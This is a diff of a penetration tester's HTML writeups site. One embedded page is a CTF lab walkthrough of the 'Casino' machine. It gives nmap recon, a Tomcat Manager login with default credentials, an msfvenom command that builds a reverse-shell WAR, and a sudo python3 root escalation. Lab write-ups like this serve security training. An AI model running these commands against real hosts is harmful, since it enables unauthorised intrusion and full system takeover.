@@ -3,387 +3,620 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>MyBitByte – Terminal</title>
+    <title>MyBitByte – Writeups</title>
+
+    <!-- Font Awesome for icons (CDN) -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+
     <style>
-        /* ============================================
-           HACKER / MATRIX TERMINAL
-           ============================================ */
+        /* ============================================================
+           RESET & BASE
+           ============================================================ */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
-        body {
-            background: #0a0a0a;
-            color: #00ff41;
-            font-family: 'Courier New', monospace;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 1.5rem;
+        :root {
+            --bg-primary: #0a0a0a;
+            --bg-secondary: #111;
+            --bg-sidebar: #0d0d0d;
+            --text-primary: #00ff41;
+            --text-secondary: #b9f6ca;
+            --text-muted: #69f0ae;
+            --border-color: #00ff41;
+            --shadow-color: rgba(0, 255, 65, 0.15);
+            --accent: #00e676;
+            --font-mono: 'Courier New', monospace;
+            --font-sans: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
 
-        .terminal-window {
-            max-width: 900px;
-            width: 100%;
-            background: #0a0a0a;
-            border: 1px solid #00ff41;
-            border-radius: 12px;
-            box-shadow: 0 0 40px rgba(0, 255, 65, 0.15);
-            padding: 1.5rem 1.8rem;
-            min-height: 400px;
+        /* Light mode (optional) */
+        body.light {
+            --bg-primary: #f5f5f5;
+            --bg-secondary: #e8e8e8;
+            --bg-sidebar: #f0f0f0;
+            --text-primary: #1a1a1a;
+            --text-secondary: #333;
+            --text-muted: #555;
+            --border-color: #ccc;
+            --shadow-color: rgba(0, 0, 0, 0.1);
+        }
+
+        html,
+        body {
+            height: 100%;
+            background: var(--bg-primary);
+            color: var(--text-secondary);
+            font-family: var(--font-sans);
+            transition: background 0.3s, color 0.3s;
+        }
+
+        /* ============================================================
+           LAYOUT
+           ============================================================ */
+        .app {
+            display: flex;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* ── Sidebar ── */
+        .sidebar {
+            width: 280px;
+            background: var(--bg-sidebar);
+            border-right: 1px solid var(--border-color);
             display: flex;
             flex-direction: column;
+            padding: 1.2rem 0;
+            flex-shrink: 0;
+            overflow-y: auto;
+            transition: width 0.3s;
         }
 
-        /* Terminal header (like real terminal tabs) */
-        .terminal-header {
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-            padding-bottom: 0.8rem;
-            border-bottom: 1px solid rgba(0, 255, 65, 0.2);
+        .sidebar-header {
+            padding: 0 1.2rem 1rem 1.2rem;
+            border-bottom: 1px solid var(--border-color);
             margin-bottom: 1rem;
         }
 
-        .dot {
-            width: 14px;
-            height: 14px;
-            border-radius: 50%;
-            display: inline-block;
+        .sidebar-header h1 {
+            font-size: 1.5rem;
+            color: var(--text-primary);
+            font-family: var(--font-mono);
         }
 
-        .dot-red {
-            background: #ff5f56;
-        }
-        .dot-yellow {
-            background: #ffbd2e;
-        }
-        .dot-green {
-            background: #27c93f;
+        .sidebar-header h1 i {
+            color: var(--accent);
         }
 
-        .terminal-title {
-            color: rgba(0, 255, 65, 0.5);
-            font-size: 0.8rem;
-            margin-left: 0.8rem;
-            letter-spacing: 1px;
+        .sidebar-search {
+            padding: 0 1.2rem 1rem 1.2rem;
         }
 
-        /* Output area */
-        #output {
+        .sidebar-search input {
+            width: 100%;
+            padding: 0.5rem 0.8rem;
+            background: var(--bg-primary);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            color: var(--text-secondary);
+            font-family: inherit;
+            outline: none;
+        }
+
+        .sidebar-search input::placeholder {
+            color: var(--text-muted);
+            opacity: 0.6;
+        }
+
+        .sidebar-search input:focus {
+            border-color: var(--accent);
+        }
+
+        /* ── Navigation ── */
+        .nav {
             flex: 1;
             overflow-y: auto;
-            margin-bottom: 0.5rem;
-            line-height: 1.6;
-            font-size: 0.95rem;
-            white-space: pre-wrap;
-            word-wrap: break-word;
-            max-height: 500px;
+            padding: 0 0.5rem;
         }
 
-        #output .prompt {
-            color: #00ff41;
+        .nav ul {
+            list-style: none;
         }
 
-        #output .command {
-            color: #69f0ae;
+        .nav li {
+            margin-bottom: 0.2rem;
         }
 
-        #output .output {
-            color: #b9f6ca;
+        .nav a {
+            display: block;
+            padding: 0.4rem 0.8rem;
+            color: var(--text-muted);
+            text-decoration: none;
+            border-radius: 4px;
+            font-size: 0.9rem;
+            transition: all 0.2s;
         }
 
-        #output .error {
-            color: #ff1744;
+        .nav a:hover,
+        .nav a.active {
+            background: var(--border-color);
+            color: var(--bg-primary);
         }
 
-        #output .highlight {
-            color: #ffea00;
-        }
-
-        /* Input line */
-        .input-line {
-            display: flex;
-            align-items: center;
-            border-top: 1px solid rgba(0, 255, 65, 0.1);
-            padding-top: 0.8rem;
-            margin-top: 0.3rem;
-        }
-
-        .input-line .prompt-symbol {
-            color: #00ff41;
+        .nav .section-title {
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: var(--text-muted);
+            opacity: 0.6;
+            padding: 0.8rem 0.8rem 0.2rem 0.8rem;
             font-weight: bold;
-            margin-right: 0.6rem;
-            white-space: nowrap;
         }
 
-        #command-input {
+        .nav .sub-items {
+            padding-left: 1.2rem;
+        }
+
+        .nav .sub-items a {
+            font-size: 0.85rem;
+        }
+
+        /* ── Main Content ── */
+        .main {
             flex: 1;
+            overflow-y: auto;
+            padding: 2rem 3rem;
+            background: var(--bg-primary);
+        }
+
+        .main h1 {
+            color: var(--text-primary);
+            font-family: var(--font-mono);
+            border-bottom: 2px solid var(--border-color);
+            padding-bottom: 0.5rem;
+            margin-bottom: 1.5rem;
+            font-size: 2.2rem;
+        }
+
+        .main h2 {
+            color: var(--accent);
+            margin: 2rem 0 1rem 0;
+            border-left: 4px solid var(--border-color);
+            padding-left: 1rem;
+        }
+
+        .main h3 {
+            color: var(--text-muted);
+            margin: 1.5rem 0 0.8rem 0;
+        }
+
+        .main p {
+            line-height: 1.7;
+            margin-bottom: 1rem;
+        }
+
+        .main code {
+            background: var(--bg-secondary);
+            padding: 0.2rem 0.5rem;
+            border-radius: 4px;
+            font-family: var(--font-mono);
+            font-size: 0.9rem;
+            color: var(--text-primary);
+            border: 1px solid var(--border-color);
+        }
+
+        .main pre {
+            background: var(--bg-secondary);
+            padding: 1.2rem;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            overflow-x: auto;
+            margin: 1rem 0;
+            color: var(--text-secondary);
+            font-family: var(--font-mono);
+            font-size: 0.85rem;
+        }
+
+        .main pre code {
             background: transparent;
             border: none;
-            outline: none;
-            color: #00ff41;
-            font-family: 'Courier New', monospace;
-            font-size: 0.95rem;
-            caret-color: #00ff41;
+            padding: 0;
+            color: inherit;
         }
 
-        #command-input::selection {
-            background: #00ff41;
-            color: #000;
+        .main ul,
+        .main ol {
+            padding-left: 2rem;
+            margin-bottom: 1rem;
         }
 
-        /* Scrollbar */
-        #output::-webkit-scrollbar {
-            width: 6px;
+        .main table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5rem 0;
         }
-        #output::-webkit-scrollbar-track {
-            background: #0a0a0a;
+
+        .main table th,
+        .main table td {
+            border: 1px solid var(--border-color);
+            padding: 0.5rem 0.8rem;
+            text-align: left;
         }
-        #output::-webkit-scrollbar-thumb {
-            background: #00ff41;
+
+        .main table th {
+            background: var(--bg-secondary);
+            color: var(--text-primary);
+        }
+
+        .main a {
+            color: var(--accent);
+            text-decoration: none;
+            border-bottom: 1px dotted var(--accent);
+        }
+
+        .main a:hover {
+            color: var(--text-primary);
+        }
+
+        /* ── Theme Toggle ── */
+        .theme-toggle {
+            position: fixed;
+            bottom: 1.5rem;
+            right: 1.5rem;
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 50%;
+            width: 44px;
+            height: 44px;
+            color: var(--text-primary);
+            font-size: 1.2rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s;
+            z-index: 100;
+        }
+
+        .theme-toggle:hover {
+            background: var(--border-color);
+            color: var(--bg-primary);
+        }
+
+        /* ── Responsive ── */
+        @media (max-width: 768px) {
+            .sidebar {
+                width: 0;
+                padding: 0;
+                overflow: hidden;
+                border: none;
+            }
+            .sidebar.open {
+                width: 280px;
+                padding: 1.2rem 0;
+                border-right: 1px solid var(--border-color);
+                position: fixed;
+                top: 0;
+                left: 0;
+                height: 100%;
+                background: var(--bg-sidebar);
+                z-index: 50;
+                overflow-y: auto;
+            }
+            .main {
+                padding: 1.5rem;
+            }
+            .menu-toggle {
+                display: block !important;
+            }
+        }
+
+        .menu-toggle {
+            display: none;
+            position: fixed;
+            top: 1rem;
+            left: 1rem;
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            padding: 0.4rem 0.8rem;
+            color: var(--text-primary);
+            font-size: 1.2rem;
+            cursor: pointer;
+            z-index: 60;
+        }
+
+        /* Hide scrollbar for cleaner look */
+        .sidebar::-webkit-scrollbar,
+        .main::-webkit-scrollbar {
+            width: 4px;
+        }
+        .sidebar::-webkit-scrollbar-thumb,
+        .main::-webkit-scrollbar-thumb {
+            background: var(--border-color);
             border-radius: 4px;
-        }
-
-        /* Responsive */
-        @media (max-width: 600px) {
-            .terminal-window {
-                padding: 1rem;
-            }
-            #output {
-                font-size: 0.8rem;
-                max-height: 350px;
-            }
-            #command-input {
-                font-size: 0.8rem;
-            }
         }
     </style>
 </head>
 <body>
 
-    <div class="terminal-window">
+    <!-- ─── Mobile Menu Toggle ─── -->
+    <button class="menu-toggle" id="menuToggle">
+        <i class="fas fa-bars"></i>
+    </button>
 
-        <!-- Terminal header with dots -->
-        <div class="terminal-header">
-            <span class="dot dot-red"></span>
-            <span class="dot dot-yellow"></span>
-            <span class="dot dot-green"></span>
-            <span class="terminal-title">root@mybitbyte:~/terminal</span>
-        </div>
+    <!-- ─── Theme Toggle ─── -->
+    <button class="theme-toggle" id="themeToggle" title="Toggle light/dark mode">
+        <i class="fas fa-moon"></i>
+    </button>
 
-        <!-- Output area -->
-        <div id="output">
-            <span class="prompt">root@mybitbyte:~$</span>
-            <span class="command"> whoami</span><br />
-            <span class="output">Cybersecurity Engineer | Penetration Tester</span><br />
-            <span class="prompt">root@mybitbyte:~$</span>
-            <span class="command"> ls</span><br />
-            <span class="output">about.md  projects/  resources/  README.md</span><br />
-            <span class="prompt">root@mybitbyte:~$</span>
-            <span class="command"> <span style="color:#00ff41;">█</span></span>
-        </div>
+    <div class="app">
 
-        <!-- Input line -->
-        <div class="input-line">
-            <span class="prompt-symbol">root@mybitbyte:~$</span>
-            <input type="text" id="command-input" autofocus spellcheck="false" autocomplete="off" />
-        </div>
+        <!-- ─── SIDEBAR ─── -->
+        <aside class="sidebar" id="sidebar">
+            <div class="sidebar-header">
+                <h1><i class="fas fa-terminal"></i> MyBitByte</h1>
+            </div>
+
+            <div class="sidebar-search">
+                <input type="text" id="searchInput" placeholder="Search docs..." />
+            </div>
+
+            <nav class="nav" id="nav">
+                <ul>
+                    <li class="section-title">Writeups</li>
+                    <li><a href="#" data-page="home" class="active"><i class="fas fa-home"></i> Home</a></li>
+
+                    <li class="section-title">HackTheBox</li>
+                    <li><a href="#" data-page="htb-box1">Box 1 – Easy</a></li>
+                    <li><a href="#" data-page="htb-box2">Box 2 – Medium</a></li>
+
+                    <li class="section-title">HackSmarter</li>
+                    <li>
+                        <a href="#" data-page="hacksmarter-casino"><i class="fas fa-chevron-right"></i> Casino</a>
+                    </li>
+                    <li>
+                        <a href="#" data-page="hacksmarter-box2">Box 2 – Coming soon</a>
+                    </li>
+
+                    <li class="section-title">Resources</li>
+                    <li><a href="#" data-page="tools">Tools</a></li>
+                    <li><a href="#" data-page="about">About</a></li>
+                </ul>
+            </nav>
+        </aside>
+
+        <!-- ─── MAIN CONTENT ─── -->
+        <main class="main" id="mainContent">
+            <!-- Content is injected here by JavaScript -->
+        </main>
 
     </div>
 
     <script>
-        // ============================================
-        // INTERACTIVE TERMINAL ENGINE
-        // ============================================
+        // ============================================================
+        // PAGE CONTENT (Markdown-like HTML)
+        // ============================================================
 
-        const output = document.getElementById('output');
-        const input = document.getElementById('command-input');
+        const pages = {
 
-        // ── Command history (up/down arrows) ──
-        let history = [];
-        let historyIndex = -1;
+            home: `
+            <h1>🖥️ MyBitByte – Writeups</h1>
 
-        // ── Available commands ──
-        const commands = {
+            <p>Welcome to my cybersecurity writeup hub. Here you'll find detailed walkthroughs for machines from HackTheBox, HackSmarter, and other CTF platforms.</p>
 
-            help: () => {
-                return `
-        Available commands:
-          help      Show this help
-          whoami    Display user info
-          ls        List directory contents
-          date      Show current date & time
-          echo      Print a message (usage: echo "hello")
-          clear     Clear the terminal
-          matrix    🟢 Show the Matrix quote
-          hack      💻 Simulate hacking (just for fun)
-          sudo      Try to become root (easter egg)
-        `;
-            },
+            <p style="color: var(--text-primary); font-family: var(--font-mono);">
+            <i class="fas fa-terminal"></i> root@mybitbyte:~$ whoami
+            </p>
+            <p>Cybersecurity Engineer | Penetration Tester</p>
 
-            whoami: () => {
-                return 'Cybersecurity Engineer | Penetration Tester';
-            },
+            <h2>📖 Latest Writeups</h2>
+            <ul>
+                <li><a href="#" data-page="hacksmarter-casino">HackSmarter – Casino</a></li>
+                <li><a href="#" data-page="htb-box1">HackTheBox – Box 1</a></li>
+            </ul>
 
-            ls: () => {
-                return 'about.md  projects/  resources/  README.md';
-            },
+            <h2>🔧 Tools I Use</h2>
+            <ul>
+                <li>Nmap</li>
+                <li>Burp Suite</li>
+                <li>Metasploit</li>
+                <li>Gobuster</li>
+                <li>John the Ripper</li>
+            </ul>
 
-            date: () => {
-                return new Date().toString();
-            },
+            <p>Check out the sidebar for more.</p>
+            `,
 
-            echo: (args) => {
-                if (!args) return 'Usage: echo "text"';
-                return args;
-            },
+            'hacksmarter-casino': `
+            <h1>🎰 HackSmarter – Casino</h1>
 
-            clear: () => {
-                output.innerHTML = '';
-                return null;
-            },
+            <h2>Machine Overview</h2>
+            <table>
+                <tr><th>Detail</th><th>Value</th></tr>
+                <tr><td>Platform</td><td>HackSmarter Labs</td></tr>
+                <tr><td>Machine</td><td>Casino</td></tr>
+                <tr><td>Difficulty</td><td>Medium</td></tr>
+                <tr><td>Date</td><td>2024-08-26</td></tr>
+            </table>
 
-            matrix: () => {
-                return `
-        🟢 "The Matrix is everywhere. It is all around us."
-        🟢 "Unfortunately, no one can be told what the Matrix is.
-             You have to see it for yourself."
-        `;
-            },
+            <h2>Reconnaissance</h2>
+            <h3>Nmap Scan</h3>
+            <pre><code>nmap -sV -sC -p- -T4 10.10.x.x</code></pre>
+            <p><strong>Results:</strong></p>
+            <pre><code>PORT     STATE SERVICE     VERSION
+        22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2
+        80/tcp   open  http        Apache httpd 2.4.38
+        8080/tcp open  http        Apache Tomcat 9.0.31</code></pre>
 
-            hack: () => {
-                const lines = [
-                    '🟢 Initializing hack sequence...',
-                    '🟢 Bypassing firewall...',
-                    '🟢 Cracking encryption...',
-                    '🟢 Access granted. Welcome to the mainframe.',
-                    '🟢 Congratulations! You are now a l33t h4x0r.',
-                ];
-                let i = 0;
-                const interval = setInterval(() => {
-                    if (i < lines.length) {
-                        appendOutput(lines[i], 'output');
-                        i++;
-                        output.scrollTop = output.scrollHeight;
-                    } else {
-                        clearInterval(interval);
-                    }
-                }, 500);
-                return null; // async
-            },
+            <h2>Exploitation</h2>
+            <h3>Step 1 – Tomcat Manager</h3>
+            <p>Default credentials <code>admin:admin</code> worked on the Tomcat Manager at <code>/manager/html</code>.</p>
+            <pre><code>curl -u admin:admin http://10.10.x.x:8080/manager/html</code></pre>
+            <p>Deploy a malicious WAR file using <code>msfvenom</code>:</p>
+            <pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.x.x LPORT=4444 -f war -o shell.war</code></pre>
+            <p>Upload and deploy – reverse shell received.</p>
 
-            sudo: () => {
-                return '🔴 Permission denied. (You are not in the sudoers file.)';
-            },
+            <h3>Step 2 – Privilege Escalation</h3>
+            <p>Check sudo rights:</p>
+            <pre><code>sudo -l</code></pre>
+            <p>We can run <code>/usr/bin/python3</code> with no password. Exploit:</p>
+            <pre><code>sudo python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+            <p>Now we are root.</p>
+
+            <h2>Flags</h2>
+            <table>
+                <tr><th>Flag</th><th>Hash</th></tr>
+                <tr><td>User</td><td><code>flag{user_...}</code></td></tr>
+                <tr><td>Root</td><td><code>flag{root_...}</code></td></tr>
+            </table>
+
+            <h2>Lessons Learned</h2>
+            <ul>
+                <li>Always try default credentials on management interfaces.</li>
+                <li>Tomcat manager can be a quick win.</li>
+                <li>Check <code>sudo -l</code> for privilege escalation vectors.</li>
+            </ul>
+
+            <p><a href="#" data-page="home">← Back to Home</a></p>
+            `,
+
+            'htb-box1': `
+            <h1>🔓 HackTheBox – Box 1 (Easy)</h1>
+            <p>Coming soon – this is a placeholder for your HTB writeup.</p>
+            <p><a href="#" data-page="home">← Back to Home</a></p>
+            `,
+
+            'htb-box2': `
+            <h1>🔓 HackTheBox – Box 2 (Medium)</h1>
+            <p>Coming soon.</p>
+            <p><a href="#" data-page="home">← Back to Home</a></p>
+            `,
+
+            tools: `
+            <h1>🛠️ Security Tools</h1>
+            <ul>
+                <li><strong>Nmap</strong> – Network scanning</li>
+                <li><strong>Burp Suite</strong> – Web proxy & testing</li>
+                <li><strong>Metasploit</strong> – Exploitation framework</li>
+                <li><strong>Gobuster</strong> – Directory busting</li>
+                <li><strong>John the Ripper</strong> – Password cracking</li>
+                <li><strong>Wireshark</strong> – Packet analysis</li>
+            </ul>
+            <p><a href="#" data-page="home">← Back to Home</a></p>
+            `,
+
+            about: `
+            <h1>📄 About</h1>
+            <p>This site is a collection of my cybersecurity writeups and resources.</p>
+            <p>I'm a passionate security researcher with a focus on penetration testing and red teaming.</p>
+            <p>Connect with me on <a href="https://github.com/donmedfor" target="_blank">GitHub</a>.</p>
+            <p><a href="#" data-page="home">← Back to Home</a></p>
+            `
         };
 
-        // ── Helper to append output ──
-        function appendOutput(text, className = 'output') {
-            const line = document.createElement('div');
-            line.innerHTML = text; // allow HTML
-            line.className = className;
-            output.appendChild(line);
-            output.scrollTop = output.scrollHeight;
+        // ============================================================
+        // RENDER ENGINE
+        // ============================================================
+
+        const main = document.getElementById('mainContent');
+        const navLinks = document.querySelectorAll('.nav a[data-page]');
+        const searchInput = document.getElementById('searchInput');
+        const sidebar = document.getElementById('sidebar');
+        const menuToggle = document.getElementById('menuToggle');
+
+        // ── Render a page ──
+        function renderPage(pageId) {
+            const content = pages[pageId] || `<h1>404</h1><p>Page not found.</p>`;
+            main.innerHTML = content;
+
+            // Highlight active link
+            navLinks.forEach(link => link.classList.remove('active'));
+            const activeLink = document.querySelector(`.nav a[data-page="${pageId}"]`);
+            if (activeLink) activeLink.classList.add('active');
+
+            // Update URL hash (optional)
+            if (history.pushState) {
+                history.pushState(null, '', `#${pageId}`);
+            }
+
+            // Close mobile sidebar after navigation
+            if (window.innerWidth <= 768) {
+                sidebar.classList.remove('open');
+            }
+
+            // Re-bind clicks on internal links (for navigation)
+            main.querySelectorAll('a[data-page]').forEach(link => {
+                link.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    renderPage(link.dataset.page);
+                });
+            });
         }
 
-        // ── Execute command ──
-        function executeCommand(cmd) {
-            // Strip leading/trailing spaces
-            cmd = cmd.trim();
-
-            if (!cmd) {
-                // Empty line – just show prompt
-                return;
-            }
-
-            // Split command and args
-            const parts = cmd.match(/(".*?"|[^\s]+)/g);
-            const name = parts ? parts[0] : '';
-            const args = parts ? parts.slice(1).join(' ') : '';
-
-            // Show the command in output
-            const promptLine = document.createElement('div');
-            promptLine.innerHTML = `<span class="prompt">root@mybitbyte:~$</span> <span class="command">${escapeHtml(cmd)}</span>`;
-            output.appendChild(promptLine);
-
-            // Handle built-in commands
-            let response;
-            if (commands[name]) {
-                response = commands[name](args);
-            } else {
-                response = `Command not found: ${name}. Type 'help' for available commands.`;
-                appendOutput(response, 'error');
-                output.scrollTop = output.scrollHeight;
-                return;
-            }
-
-            // If response is null (e.g., clear, async hack), skip
-            if (response !== null) {
-                appendOutput(response, 'output');
-            }
-
-            output.scrollTop = output.scrollHeight;
-        }
-
-        // ── Escape HTML to prevent XSS ──
-        function escapeHtml(text) {
-            const div = document.createElement('div');
-            div.textContent = text;
-            return div.innerHTML;
-        }
-
-        // ── Event listeners ──
-
-        input.addEventListener('keydown', (e) => {
-            if (e.key === 'Enter') {
-                const cmd = input.value;
-                if (cmd.trim()) {
-                    history.push(cmd);
-                    historyIndex = history.length;
-                }
-                executeCommand(cmd);
-                input.value = '';
-                // Re-focus
-                input.focus();
-                e.preventDefault();
-            }
-
-            // Up arrow → history backward
-            if (e.key === 'ArrowUp') {
-                if (historyIndex > 0) {
-                    historyIndex--;
-                    input.value = history[historyIndex];
-                }
-                e.preventDefault();
-            }
-
-            // Down arrow → history forward
-            if (e.key === 'ArrowDown') {
-                if (historyIndex < history.length - 1) {
-                    historyIndex++;
-                    input.value = history[historyIndex];
+        // ── Search ──
+        searchInput.addEventListener('input', function() {
+            const query = this.value.toLowerCase().trim();
+            const links = document.querySelectorAll('.nav a[data-page]');
+            links.forEach(link => {
+                const text = link.textContent.toLowerCase();
+                const parent = link.closest('li');
+                if (text.includes(query) || query === '') {
+                    parent.style.display = '';
                 } else {
-                    historyIndex = history.length;
-                    input.value = '';
+                    parent.style.display = 'none';
                 }
+            });
+        });
+
+        // ── Handle nav clicks ──
+        navLinks.forEach(link => {
+            link.addEventListener('click', (e) => {
                 e.preventDefault();
+                renderPage(link.dataset.page);
+            });
+        });
+
+        // ── Mobile menu toggle ──
+        menuToggle.addEventListener('click', () => {
+            sidebar.classList.toggle('open');
+        });
+
+        // ── Theme toggle ──
+        const themeToggle = document.getElementById('themeToggle');
+        themeToggle.addEventListener('click', () => {
+            document.body.classList.toggle('light');
+            const icon = themeToggle.querySelector('i');
+            if (document.body.classList.contains('light')) {
+                icon.className = 'fas fa-sun';
+            } else {
+                icon.className = 'fas fa-moon';
             }
         });
 
-        // Keep focus on the page
-        document.addEventListener('click', () => {
-            input.focus();
+        // ── Load initial page from URL hash ──
+        function loadFromHash() {
+            const hash = window.location.hash.replace('#', '');
+            const page = pages[hash] ? hash : 'home';
+            renderPage(page);
+        }
+
+        window.addEventListener('hashchange', loadFromHash);
+        loadFromHash();
+
+        // ── Click outside sidebar closes it on mobile ──
+        document.addEventListener('click', (e) => {
+            if (window.innerWidth <= 768) {
+                if (!sidebar.contains(e.target) && e.target !== menuToggle) {
+                    sidebar.classList.remove('open');
+                }
+            }
         });
 
-        // Initial focus
-        window.addEventListener('load', () => {
-            input.focus();
-            // Ensure cursor is at the end of the prompt (it's an input)
-        });
+        console.log('🟢 MyBitByte – Writeups loaded.');
     </script>
 
 </body>
